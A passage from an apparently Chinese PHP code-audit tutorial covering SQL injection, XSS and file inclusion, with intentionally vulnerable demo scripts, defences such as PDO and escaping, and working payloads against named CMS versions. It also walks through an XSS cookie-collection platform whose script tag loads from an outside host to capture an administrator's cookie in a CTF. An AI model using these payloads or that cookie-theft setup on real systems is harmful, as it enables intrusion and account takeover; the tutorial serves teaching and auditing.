<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;5&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------+------------------------</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span>    username  <span class="hljs-operator">|</span> password                   <br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------+------------------------</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-number">2</span>            <span class="hljs-operator">|</span> <span class="hljs-number">5</span>                         <br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> admin        <span class="hljs-operator">|</span> <span class="hljs-number">51</span>b7a76d51e70b419f60d34 <br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------- --+------------------------</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br>    <br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;6&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-operator">|</span>id   <span class="hljs-operator">|</span> username  <span class="hljs-operator">|</span> password                  <br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span>  <span class="hljs-operator">|</span> admin     <span class="hljs-operator">|</span><span class="hljs-number">51</span>b7a76d51e70b419f60d3<br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span>  <span class="hljs-operator">|</span>    <span class="hljs-number">2</span>      <span class="hljs-operator">|</span> <span class="hljs-number">6</span>                          <br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure></li></ul><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><ul><li>相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。</li><li>一般格式if((bool),sleep(3),0)和or (case when (bool) then sleep(3) else 0 end)</li><li>两个函数：</li><li>BENCHMARK(100000,MD5(1))</li><li>sleep(5)</li><li>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源，推荐使用sleep()。</li></ul><h3 id="Mysql注释符"><a href="#Mysql注释符" class="headerlink" title="Mysql注释符"></a>Mysql注释符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span> <span class="hljs-comment">-- -</span><br><span class="hljs-number">2.</span> <span class="hljs-comment">/* .... */</span><br><span class="hljs-number">3.</span> #<br><span class="hljs-number">4.</span> `<br><span class="hljs-number">5.</span> ;<span class="hljs-operator">%</span><span class="hljs-number">00</span> <br></code></pre></td></tr></table></figure><h3 id="GBK绕过注入"><a href="#GBK绕过注入" class="headerlink" title="GBK绕过注入"></a>GBK绕过注入</h3><ul><li>在分号前加%df%27</li><li>示例：id&#x3D;1%df%27 union select 1.2–+</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以HDWiki v6.0 UTF8-20170209 前台sql注入为例，index.php?doc-create创建词条可以通过<code>aaaa……aa&#39;</code> 81个字符，经过转义变成<code>aaaa……aa\&#39;</code>82个字符，经过截断变成<code>aaaa……aa\</code>81个字符，将sql语句中的单引号转义，并且后面一个参数用户可控，产生了SQL注入</p><p><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</code></p><p><code>，concat(user(),0x7c,database(),0x7c,version()),1,1,#</code></p><h3 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><h4 id="gpc-x2F-rutime魔术引号"><a href="#gpc-x2F-rutime魔术引号" class="headerlink" title="gpc&#x2F;rutime魔术引号"></a>gpc&#x2F;rutime魔术引号</h4><ul><li>magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤</li><li>magic_quotes_runtime对从数据库或者文件中获取的数据进行过滤。上面的二次注入可以使用这个函数对特殊符号转义</li></ul><p>开启这两个选项也只能防御部分SQL注入。因为他们只对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义,在int型注入上没有太大作用。</p><h4 id="过滤函数和类"><a href="#过滤函数和类" class="headerlink" title="过滤函数和类"></a>过滤函数和类</h4><h5 id="addslashes函数"><a href="#addslashes函数" class="headerlink" title="addslashes函数"></a>addslashes函数</h5><p>addslashes也是对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义，大多数程序使用它实在程序入口，判断如果没有没有开启gpc,则使用它对参数进行过滤,不过他的参数必须是string,所以如果参数是数组类型,那么必须使用此函数对数组递归过滤。</p><h5 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_[real]_escape_string"></a>mysql_[real]_escape_string</h5><p>mysql_escape_string和mysql_real_escape_string函数都是对字符串进行过滤,在php4.0.3以上版本才有这两个函数,<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code>。不同在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转义字符串,所以最好使用mysql_real_escape_string。</p><p>mysql_escape_string</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$item</span> = <span class="hljs-string">&quot;Zak&#x27;s Laptop&quot;</span>;<br><span class="hljs-variable">$escaped_item</span> = <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$item</span>);<br></code></pre></td></tr></table></figure><p>mysql_real_escape_string</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-variable">$item</span> = <span class="hljs-string">&quot;Zak&#x27;s Laptop&quot;</span>;<br><span class="hljs-variable">$escaped_item</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$item</span>,<span class="hljs-variable">$conn</span>);<br></code></pre></td></tr></table></figure><h6 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h6><p>将字符转换成数值</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;1 union select&#x27;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><h4 id="PDO预编译方式"><a href="#PDO预编译方式" class="headerlink" title="PDO预编译方式"></a>PDO预编译方式</h4><p>使用PDO方式基本可以防止sql注入,原因是因为有两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。但是还是存在特殊情况会在使用了PDO方式也会存在注入,可以参考<a href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218">https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218</a></p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=test&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-variable">$sta</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;select * from table where name = ?&#x27;</span>); <span class="hljs-comment">//准备 SQL 模版，其中 ? 代表一个参数。</span><br><span class="hljs-variable">$sta</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name1&#x27;</span>)); <span class="hljs-comment">//通过数组设置参数，执行 SQL 模版</span><br></code></pre></td></tr></table></figure><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h3 id="成因与危害"><a href="#成因与危害" class="headerlink" title="成因与危害"></a>成因与危害</h3><p>参数没有被过滤或严格过滤,且参数传入到了输出函数,被输出到了页面。常出现在文章发表、评论回复、留言、资料修改等地方。</p><p>可能产生如下危害:</p><ul><li>窃取cookie</li><li>修改页面进行钓鱼</li><li>前端能做的事情,xss都能做到</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型、存储型、dom型</p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>经过了后端,但是没有经过经过数据库。</p><p>数据流向: 浏览器 -&gt; 后端 -&gt; 浏览器</p><p>eg:</p><p>reflectxss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">XSS反射演示<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;xss&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$xss</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$xss</span>!==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$xss</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/reflectxss.php?xss=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p><p>恶意利用(以获取用户cookie为例):<br>比如<code>http://xxx.com/xxx.php?aaa=攻击者编写的获取用户cookie的代码</code>存在反射型xss,<br>攻击者可以把构造好的链接发到论坛或者其他方式诱导用户点击,如果用户点击了链接,那么用户的cookie会被攻击者的服务器收到,攻击者可以利用用户的cookie登陆目标网站</p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>数据经过了后端,经过了数据库。</p><p>数据流向: 浏览器-&gt; 后端-&gt; 数据库-&gt; 后端-&gt; 浏览器</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table xss (<br>    id int(10) unsigned NOT NULL AUTO_INCREMENT,<br>    payload varchar(100) NOT NULL,<br>    PRIMARY KEY (id)<br>)ENGINE=MyISAM DEFAULT CHARSET=utf8;<br></code></pre></td></tr></table></figure><p>storagexss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">\\存储XSS演示<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;xss&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xss</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xss&#x27;</span>];<br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$xss</span>!==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into xss(id,payload) values(1,&#x27;<span class="hljs-subst">$xss</span>&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>storagexsshow.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select payload from xss&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>storagexss.php post:<code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>访问storagexsshow.php会弹出cookie</p><p>恶意利用(以评论区存在存储型xss为例):假如某网站评论区存在xss存储行漏洞,攻击者在评论中插入获取cookie的代码,当每个用户看到此评论时,他们的cookie都会被发送到攻击者服务器。</p><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>没有经过后端,只在前端触发。</p><p>数据流向是：URL–&gt;浏览器 </p><p>eg:</p><p>domxss.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//禁用错误报告</span><br><span class="hljs-variable">$q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;q&quot;</span>];<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;q&quot;</span> id=<span class="hljs-string">&#x27;text&#x27;</span> value=<span class="hljs-string">&quot;&lt;?php echo <span class="hljs-subst">$q</span>;?&gt;&quot;</span> /&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;div id=<span class="hljs-string">&quot;print&quot;</span>&gt;&lt;/div&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">var</span> text = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;text&quot;</span>); <br><span class="hljs-keyword">var</span> <span class="hljs-keyword">print</span> = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;print&quot;</span>);<br><span class="hljs-keyword">print</span>.innerHTML = text.value + <span class="hljs-string">&#x27; not found&#x27;</span>; <span class="hljs-comment">// 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/domxss.php?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p><p>恶意利用和反射型xss类似</p><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>以ESPCMS P8.18101601n 前台XSS为例，问题主要由于错误页面的报错信息未作过滤，造成XSS漏洞。</p><p>payload:<code>http://127.0.0.1/espcms/index.php?ac=%3C/code%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;at=List&amp;tid=7</code></p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ul><li>特殊字符HTML实体编码</li><li>标签黑白名单(推荐白名单,黑名单可能存在不可预测的绕过)</li><li>请求头设置HttpOnly属性(cookie不能通过js调用获取)</li></ul><h3 id="XSS-平台使用简要教程"><a href="#XSS-平台使用简要教程" class="headerlink" title="XSS 平台使用简要教程"></a>XSS 平台使用简要教程</h3><h4 id="找一个xss接收平台，并完成注册等一系列操作"><a href="#找一个xss接收平台，并完成注册等一系列操作" class="headerlink" title="找一个xss接收平台，并完成注册等一系列操作"></a>找一个xss接收平台，并完成注册等一系列操作</h4><p>这里以 <a href="https://xsshs.cn/">https://xsshs.cn/</a> 做例子</p><p><img src="https://s2.ax1x.com/2020/02/07/12BSxg.png" alt="12BSxg.png"></p><p>登陆平台</p><h4 id="创建和配置项目"><a href="#创建和配置项目" class="headerlink" title="创建和配置项目"></a>创建和配置项目</h4><p><img src="https://s2.ax1x.com/2020/02/07/12B9MQ.png" alt="12B9MQ.png"></p><p><img src="https://s2.ax1x.com/2020/02/07/12BCrj.png" alt="12BCrj.png"></p><p>填写好项目名称和描述（自定义）</p><p>然后进行配置：</p><p><img src="https://s2.ax1x.com/2020/02/07/120Oat.png" alt="120Oat.png"></p><p>比如这里我们需要获取管理员的cookie，就勾上<img src="https://s2.ax1x.com/2020/02/07/120LVI.png" alt="120LVI.png"></p><p>点击下一步</p><p>就会进入到项目代码，注意，上面的代码都是已经封装好的了，包括接收url什么的，我们直接使用就可以了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><img src="https://s2.ax1x.com/2020/02/07/120I2D.png" alt="120I2D.png"></p><p>比如我们随便挑一个最简单的来使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;sCrIpt srC=<span class="hljs-comment">//xs.sb/boJN&gt;&lt;/sCRipT&gt;</span><br></code></pre></td></tr></table></figure><p>我们以C1CTF的xss题目来做例子</p><p><img src="https://s2.ax1x.com/2020/02/07/120Hrd.png" alt="120Hrd.png"></p><p>将代码复制到你觉得可能会产生xss的地方，这里点提交后，保存了在一个页面</p><p><img src="https://s2.ax1x.com/2020/02/07/1204PK.png" alt="1204PK.png"></p><p>当有用户（带cookie）访问这个页面的时候，此用户的cookie就会被获取并且发送到我们的平台，一般来说我们需要admin的cookie。这题的逻辑是直接发送页面id让管理员检查</p><p><img src="https://s2.ax1x.com/2020/02/07/120vPf.png" alt="120vPf.png"></p><p>然后就等着接收就可以了。</p><h4 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h4><p>在平台里的项目内容里就可以查看到xss的结果了</p><p><img src="https://s2.ax1x.com/2020/02/07/120xG8.png" alt="120xG8.png"></p><h3 id="收集常见的XSS-payload"><a href="#收集常见的XSS-payload" class="headerlink" title="收集常见的XSS payload"></a>收集常见的XSS payload</h3><p><a href="https://packetstormsecurity.com/files/112152/Cross-Site-Scripting-Payloads.html">Cross-Site-Scripting-Payloads</a></p><h2 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h2><p>总的来说时因为没有经过严格的验证,操作的文件是否在允许的范围内。</p><p>危害:</p><ul><li>导致恶意文件&#x2F;代码包含</li><li>导致敏感文件被读取</li><li>导致文件被删除</li><li>导致恶意文件上传</li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含分为本地文件包含(local file include)、远程文件包含(remote file include)。文件包含可以导致恶意代码被包含,从而获取webshell</p><p>文件包含利用函数:</p><ul><li>include(即使文件被包含过,也会再次包含,包含文件遇到错误代码也会继续执行)</li><li>include_once(文件被包含过了,就不会再次包含,包含文件遇到错误也会继续执行)</li><li>require(即使文件被包含过,也会再次包含,包含文件遇到错误程序直接退出)</li><li>require_once(文件被包含过了,就不会再次包含,包含文件遇到错误程序直接退出)</li><li>…</li></ul><p>本地文件包含(LFI):</p><p>只能包含本机文件,大多出现在模块加载、模板加载和cache调用等地方。<br>本地文件包含方式也有多种,比如上传一个允许上传的文件格式的文件在包含,包含PHP上传的临时文件,webserver记录到日志后在包含webserver的日志,linux下可以包含&#x2F;proc&#x2F;self&#x2F;environ文件等。</p><p>eg:<br>localfileinclude.php(test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;ROOT&quot;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$mod</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mod&#x27;</span>];<br><span class="hljs-keyword">echo</span> ROOT.<span class="hljs-variable">$mod</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">include</span>(ROOT.<span class="hljs-variable">$mod</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>lfishell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/localfileinclude.php?mod=lfishell</code></p><p>远程文件包含:</p><p>可以包含远程文件。需要设置allow_url_include&#x3D;on。支持http、ftp、php伪协议、zip、file等协议。</p><p>eg:</p><p>remotefileinclude.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用python开启一个见到的服务器:<br><code>python -m SimpleHTTPServer 8080</code></p><p>rfi.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/remotefileinclude.php?url=http://127.0.0.1:8080/Desktop/rfi.txt</code></p><p>使用伪协议(举两个伪协议例子):</p><p>php:&#x2F;&#x2F;input</p><ul><li>allow_url_fopen：off&#x2F;on</li><li>allow_url_include：on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://input</code><br><code>post: &lt;?php phpinfo();?&gt;</code></li></ul><p>php:&#x2F;&#x2F;filter</p><ul><li>allow_url_fopen：off&#x2F;on</li><li>allow_url_include：off&#x2F;on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://filter/read=convert.base64-encode/resource=remotefileinclude.php</code></li></ul><p>截断包含:</p><p>00截断(受限于GPC和addslashes等函数影响,php5.3之后也不能使用这个方法,不过现在很少有这个漏洞了):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>假如你发现了截断包含漏洞,然后又只能上传某些固定后缀的文件,那可以试下00截断</p><p><code>http://127.0.0.1/truncatedinclude.php?a=aaa.txt%00</code></p><p>多个<code>.</code>和<code>/</code>截断,不受GPC限制,但是在php5.3之后修复</p><h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取(下载)"></a>文件读取(下载)</h3><p>程序在下载文件或者读取显示文件的时候,读取文件的参数直接在请求中传递,后台程序获取到这个文件后直接读取返回,问题在于这个参数是用户可控的,可以直接传入想要的文件路径。</p><p>文件读取或者下载函数:</p><ul><li>file_get_contents</li><li>high_light</li><li>fopen</li><li>readfile</li><li>fread</li><li>…</li></ul><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/fileread.php?file=aaa.txt</code></p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" 